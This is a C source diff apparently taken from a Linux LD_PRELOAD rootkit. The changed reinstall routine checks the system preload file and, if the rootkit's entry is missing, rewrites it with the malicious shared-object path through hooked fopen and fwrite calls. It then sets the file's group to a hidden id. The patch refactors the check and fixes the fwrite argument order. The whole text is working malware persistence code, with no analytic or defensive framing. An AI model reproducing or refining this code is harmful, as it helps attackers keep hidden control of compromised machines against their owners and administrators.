@@ -1,4 +1,4 @@
-int preloadok(const char *preloadpath){ // returns 1 if preloadpath is ok.
+int _preloadok(const char *preloadpath){ // returns 1 if preloadpath is ok.
     struct stat preloadstat;
     int status = 1,
         statret;
@@ -14,15 +14,23 @@ int preloadok(const char *preloadpath){ // returns 1 if preloadpath is ok.
     return status;
 }
 
+int preloadok(void){
+    char *preloadpath = OLD_PRELOAD;
+#ifdef PATCH_DYNAMIC_LINKER
+    preloadpath = PRELOAD_FILE;
+#endif
+    return _preloadok(preloadpath);
+}
+
 void reinstall(const char *preloadpath){
-    if(preloadok(preloadpath))
+    if(preloadok())
         return;
 
     hook(CFOPEN, CFWRITE);
     FILE *ldfp = call(CFOPEN, preloadpath, "w");
 
     if(ldfp != NULL){
-        call(CFWRITE, SOPATH, strlen(SOPATH), 1, ldfp);
+        call(CFWRITE, SOPATH, 1, strlen(SOPATH), ldfp);
         fflush(ldfp);
         fclose(ldfp);
         chown_path(preloadpath, readgid());
